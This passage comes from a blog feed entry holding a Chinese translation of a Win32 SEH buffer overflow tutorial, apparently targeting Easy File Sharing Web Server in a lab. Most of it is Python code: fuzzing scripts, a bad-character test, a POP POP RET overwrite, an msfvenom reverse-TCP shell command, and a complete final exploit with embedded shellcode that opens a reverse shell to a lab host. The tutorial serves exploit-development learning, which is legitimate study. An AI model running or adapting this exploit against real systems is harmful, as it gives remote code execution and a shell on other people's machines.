class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /m0chan.txtAAAAAAAAAbufferhereAAAAAAA HTTP/1.1</span><br><span class="line">Host: 172.16.10.15</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: SESSIONID=5905; UserID=; PassWD=</span><br><span class="line">If-Modified-Since: Fri, 11 May 2012 10:11:48 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>正如您在<strong>第1行上</strong>看到的那样，我们正在请求<code>m0chan.txt</code>旁边的缓冲区/图案。-让我们快速编写一些python脚本以使其变得更简单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 5000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>一旦完成运行（只要我们已<code>EFSWS</code>打开<strong>Immunity</strong>和/或连接），我们就会注意到我们实际上造成了崩溃，让我们分析下面的屏幕截图，看看我们做了什么。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141145.png" class="lozad"></p><p>如您所见，在这种情况下，我们已经用用户提供的输入超出了<strong>nSEH</strong>和<strong>SEH</strong>的地址<code>AAAA</code> <code>41414141</code>-我们也对我们有些新的限制… <strong>EAX寄存器</strong> -如您所见，右上方<code>EAX</code>包含的<code>41414141</code>是我们的<code>A</code>缓冲区。-稍后可能会有用。</p><h3 id="2-2-2-寻找偏移"><a href="#2-2-2-寻找偏移" class="headerlink" title="2.2.2 寻找偏移"></a>2.2.2 寻找偏移</h3><p>现在，我们已经分析了崩溃并找到了<em>漏洞，</em>我们可以继续计算偏移量，并计算出使<code>A&#39;s</code>我们超出<strong>SEH</strong>和<strong>nSEH</strong>指针所需的时间。为此，我将通过以下命令使用<strong>mona</strong>来计算非重复字符串（也称为<strong>循环模式）</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 5000</span><br></pre></td></tr></table></figure><p>现在，我将<code>fuzzer.py</code>再次使用我的脚本并将其修改为发送我的模式<code>5000</code> <code>A&#39;s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>我们的应用程序现在将返回崩溃状态并报告<strong>访问冲突，</strong>但是如果我们检查<strong>SEH Chain</strong>并跳转到堆栈上的<strong>SE Handler</strong>的值，我们将注意到它实际上已经超出了我们的循环模式，而不是一长串<code>A&#39;s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona po 3Ff4</span><br></pre></td></tr></table></figure><p>运行以上任一命令都将报告，超出<strong>nSEH</strong>值的偏移量是<strong>4061字节</strong> -我们现在可以修改漏洞利用以反映<code>&quot;A&quot; * 4061</code></p><p><img alt="img" data-src="https://i.imgur.com/KTyiqOU.png" class="lozad"></p><h3 id="2-2-3-寻找坏字符"><a href="#2-2-3-寻找坏字符" class="headerlink" title="2.2.3 寻找坏字符"></a>2.2.3 寻找坏字符</h3><p>在这里，我们将采用与上述相同的方法，在该方法中，我们将每个可能的字符发送到缓冲区旁边，并分析它们在内存转储中的显示方式-在此还值得注意的是，我们必须为<code>\n</code>＆排除字符，<code>\r</code>因为我们没有希望在我们的缓冲区旁边发送装盒返回和新行，以有效地分解原始<strong>HTTP请求</strong>。</p><p>我将在此处使用以下脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (4061-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>假设我们反复冲洗并找到内存转储中的所有无效字符，我们将找到所需的东西，在这种情况下，我的发现是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c</span><br></pre></td></tr></table></figure><h3 id="2-2-4-查找POP-POP-RET指令"><a href="#2-2-4-查找POP-POP-RET指令" class="headerlink" title="2.2.4 查找POP POP RET指令"></a>2.2.4 查找POP POP RET指令</h3><p>在本文中，我已经对此进行了广泛的介绍，因此，我将直接进入操作并找到包含<code>pop pop ret</code>指令的模块。</p><p>当然，我们将再次使用<strong>mona</strong>通过以下方便的命令来完成此操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>当然，这里的目标是找到一个未经任何安全限制（例如<strong>ASLR</strong>，<strong>Safe SEH</strong>等）编译的模块。</p><p>您会注意到，在运行时，<code>!mona seh</code>它会在日志窗口中显示10个结果，但没有一个真正适合您，很容易在这里感到困惑，并开始怀疑是否还有要使用的模块。然而！如果检查<code>seh.txt</code>位于<strong>mona</strong>工作目录中的<code>.txt</code>文件，您会发现一个非常大的文件，其中包含数百个，甚至数千个可用模块。</p><p>以我为例，我滚动浏览了所有以开头的模块，<code>00</code>以避免无意中在缓冲区中实现流氓<strong>空字节</strong>。</p><p>我选择的选项是 <code>0x1000108b</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141203.png" class="lozad"></p><p>现在，我将此值添加到我的python脚本中的<strong>SEH</strong>变量中，并执行它以验证我的想法是正确的，并且执行按预期进行。</p><p><strong>更新的Python脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>执行后检查<strong>抗扰性</strong>显示<strong>SEH Handler</strong>现在已被我们的<code>pop pop ret</code>小工具（也称为<strong>1001ab99）</strong>的内存地址覆盖</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141239.png" class="lozad"></p><p>而且，如果我们不通过<strong>Shift + F9</strong>将异常传递给程序，则会将<strong>nSEH</strong><code>pop pop ret</code>的值和<strong>nSEH</strong>的值放置在<strong>EIP寄存器中以</strong>备执行。<strong>答对了！</strong></p><p>在这种情况下，<strong>053A6FAC</strong>是堆栈中<strong>nSEH</strong>的地址，因此我们执行此位置的任何内容都将被执行。如下面的屏幕截图所示。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141252.png" class="lozad"></p><h3 id="2-2-5-生成Shellcode"><a href="#2-2-5-生成Shellcode" class="headerlink" title="2.2.5 生成Shellcode"></a>2.2.5 生成Shellcode</h3><p>现在与VulnServer不同，在缓冲区<strong>之后</strong>我们可以使用的空间非常有限- 在这种情况下，精确到<strong>52字节</strong>，在我们的<strong>nSEH</strong>和<strong>SEH</strong>值之后，我们<strong>还有</strong>很多空间，精确到<strong>931字节</strong>。</p><p>现在，只要对我们的shell代码进行一点编码，我们就应该能够将我们的shellcode放在这里，并<code>Short JMP</code>在<strong>nSEH</strong>指针中添加一些代码直接跳入其中。</p><p>但是，首先让我们使用可信任的<strong>MSFVenom</strong>生成一些shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c&quot;</span><br></pre></td></tr></table></figure><p>您可能会注意到，这次我选择了分段式负载，而无段式只是为了帮助减小负载大小。</p><h3 id="2-2-6-最终利用"><a href="#2-2-6-最终利用" class="headerlink" title="2.2.6 最终利用"></a>2.2.6 最终利用</h3><p>跳转到shell代码并执行最终的shellcode。为了安全起见，现在要做的所有工作就是将我们的shell代码<code>D</code>与一些缓冲区一起放在缓冲区中<code>NOPS</code>，并从<strong>nSEH</strong>执行<strong>6字节的</strong>跳转，该跳转将<strong>落入</strong>我们的NOP Sled并直接进入shellcode。</p><p>我们可以做到这一点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure><p>现在我们的最终漏洞利用将如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c&quot;</span><br><span class="line"></span><br><span class="line">shellcodenops = &quot;\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xbd\xe0\x3c\x1c\xcb\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="line">&quot;\x5b\x31\x6a\x14\x83\xea\xfc\x03\x6a\x10\x02\xc9\xe0\x23\x40&quot;</span><br><span class="line">&quot;\x32\x19\xb4\x24\xba\xfc\x85\x64\xd8\x75\xb5\x54\xaa\xd8\x3a&quot;</span><br><span class="line">&quot;\x1f\xfe\xc8\xc9\x6d\xd7\xff\x7a\xdb\x01\x31\x7a\x77\x71\x50&quot;</span><br><span class="line">&quot;\xf8\x85\xa6\xb2\xc1\x46\xbb\xb3\x06\xba\x36\xe1\xdf\xb1\xe5&quot;</span><br><span class="line">&quot;\x16\x6b\x8f\x35\x9c\x27\x1e\x3e\x41\xff\x21\x6f\xd4\x8b\x78&quot;</span><br><span class="line">&quot;\xaf\xd6\x58\xf1\xe6\xc0\xbd\x3f\xb0\x7b\x75\xb4\x43\xaa\x47&quot;</span><br><span class="line">&quot;\x35\xef\x93\x67\xc4\xf1\xd4\x40\x36\x84\x2c\xb3\xcb\x9f\xea&quot;</span><br><span class="line">&quot;\xc9\x17\x15\xe9\x6a\xdc\x8d\xd5\x8b\x31\x4b\x9d\x80\xfe\x1f&quot;</span><br><span class="line">&quot;\xf9\x84\x01\xf3\x71\xb0\x8a\xf2\x55\x30\xc8\xd0\x71\x18\x8b&quot;</span><br><span class="line">&quot;\x79\x23\xc4\x7a\x85\x33\xa7\x23\x23\x3f\x4a\x30\x5e\x62\x03&quot;</span><br><span class="line">&quot;\xf5\x53\x9d\xd3\x91\xe4\xee\xe1\x3e\x5f\x79\x4a\xb7\x79\x7e&quot;</span><br><span class="line">&quot;\xdb\xdf\x79\x50\x63\x8f\x87\x51\x94\x86\x43\x05\xc4\xb0\x62&quot;</span><br><span class="line">&quot;\x26\x8f\x40\x8a\xf3\x3a\x4a\x1c\x50\xaa\x40\x77\xc0\xc9\x54&quot;</span><br><span class="line">&quot;\x86\xaa\x47\xb2\xd8\x9c\x07\x6a\x99\x4c\xe8\xda\x71\x87\xe7&quot;</span><br><span class="line">&quot;\x05\x61\xa8\x2d\x2e\x08\x47\x98\x07\xa5\xfe\x81\xd3\x54\xfe&quot;</span><br><span class="line">&quot;\x1f\x9e\x57\x74\xaa\x5f\x19\x7d\xdf\x73\x4e\x1a\x1f\x8b\x8f&quot;</span><br><span class="line">&quot;\x8f\x1f\xe1\x8b\x19\x77\x9d\x91\x7c\xbf\x02\x69\xab\xc3\x44&quot;</span><br><span class="line">&quot;\x95\x2a\xf2\x3f\xa0\xb8\xba\x57\xcd\x2c\x3b\xa7\x9b\x26\x3b&quot;</span><br><span class="line">&quot;\xcf\x7b\x13\x68\xea\x83\x8e\x1c\xa7\x11\x31\x75\x14\xb1\x59&quot;</span><br><span class="line">&quot;\x7b\x43\xf5\xc5\x84\xa6\x85\x02\x7a\x35\xa2\xaa\x13\xc5\xf2&quot;</span><br><span class="line">&quot;\x4a\xe4\xaf\xf2\x1a\x8c\x24\xdc\x95\x7c\xc5\xf7\xfd\x14\x4c&quot;</span><br><span class="line">&quot;\x96\x4c\x84\x51\xb3\x11\x18\x52\x30\x8a\xab\x29\x39\x2d\x4c&quot;</span><br><span class="line">&quot;\xce\x53\x4a\x4c\xcf\x5b\x6c\x70\x06\x62\x1a\xb7\x9b\xd1\x05&quot;</span><br><span class="line">&quot;\x2a\x31\x2c\xae\xf3\xd0\x8d\xb3\x03\x0f\xd1\xcd\x87\xa5\xaa&quot;</span><br><span class="line">&quot;\x29\x97\xcc\xaf\x76\x1f\x3d\xc2\xe7\xca\x41\x71\x07\xdf&quot;)</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">buffer += shellcodenops</span><br><span class="line">buffer += shellcode</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>与<strong>VulnServer</strong>相似-我还在Visio中创建了一个漂亮的小图，以演示该漏洞利用过程并从较高的角度进行跳转。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141315.png" class="lozad"></p><h1 id="0x03-参考资料-资源"><a href="#0x03-参考资料-资源" class="headerlink" title="0x03 参考资料/资源"></a>0x03 参考资料/资源</h1><p>特别鸣谢以下所有民众：</p><p><a href="https://h0mbre.github.io/" target="_blank" rel="noopener">https://h0mbre.github.io</a></p><p><a href="https://www.securitysift.com/" target="_blank" rel="noopener">https://www.securitysift.com</a></p><p><a href="https://captmeelo.com/" target="_blank" rel="noopener">https://captmeelo.com</a></p><p><a href="https://www.fuzzysecurity.com/" target="_blank" rel="noopener">https://www.fuzzysecurity.com</a></p><p><a href="https://securitychops.com/" target="_blank" rel="noopener">https://securitychops.com</a></p><p><a href="https://nutcrackerssecurity.github.io/Windows4.html" target="_blank" rel="noopener">https://nutcrackerssecurity.github.io/Windows4.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这是一篇翻译的文章，出自&lt;a href=&quot;https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="-翻译文章" scheme="https://www.mad-coding.cn/categories/%E7%BF%BB%E8%AF%91%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="缓冲区溢出" scheme="https://www.mad-coding.cn/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>我的漏洞库（不断跟新中）</title>
    <link href="https://www.mad-coding.cn/2019/10/11/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93/"/>
    <id>https://www.mad-coding.cn/2019/10/11/我的漏洞库/</id>
    <published>2019-10-11T02:42:08.000Z</published>
    <updated>2019-10-11T08:55:41.223Z</updated>
    
